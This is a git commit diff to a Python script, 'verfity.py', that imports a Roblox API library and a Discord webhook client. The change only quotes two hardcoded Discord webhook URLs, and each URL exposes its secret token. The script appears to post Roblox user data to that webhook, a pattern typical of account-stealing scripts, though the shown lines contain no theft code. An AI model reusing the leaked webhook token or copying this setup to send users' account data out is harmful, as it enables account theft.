b01688d5c300c2e5627f4951650875e34ae8a43e
Adrian Lopez <146033034+Edgwardo@users.noreply.github.com>
2024-11-15 23:16:19 -0500

    Update verfity.py

--- verfity.py
+++ verfity.py
@@ -6,8 +6,8 @@ import json
 import robloxpy
 from discord_webhook import DiscordWebhook
 
-DiscordWebhookURL = https://discord.com/api/webhooks/1307176210593484871/Iw52N1iKruqwGeNNWdBf5hvIfqjrHyC0sKfC9n3-mvUFhLu4rEZ84fGUchJ3rwQSFLrA
-DiscordWebhookURL_ERROR = https://discord.com/api/webhooks/1307176210593484871/Iw52N1iKruqwGeNNWdBf5hvIfqjrHyC0sKfC9n3-mvUFhLu4rEZ84fGUchJ3rwQSFLrA
+DiscordWebhookURL = "https://discord.com/api/webhooks/1307176210593484871/Iw52N1iKruqwGeNNWdBf5hvIfqjrHyC0sKfC9n3-mvUFhLu4rEZ84fGUchJ3rwQSFLrA"
+DiscordWebhookURL_ERROR = "https://discord.com/api/webhooks/1307176210593484871/Iw52N1iKruqwGeNNWdBf5hvIfqjrHyC0sKfC9n3-mvUFhLu4rEZ84fGUchJ3rwQSFLrA"
 
 
 class PostUserData:
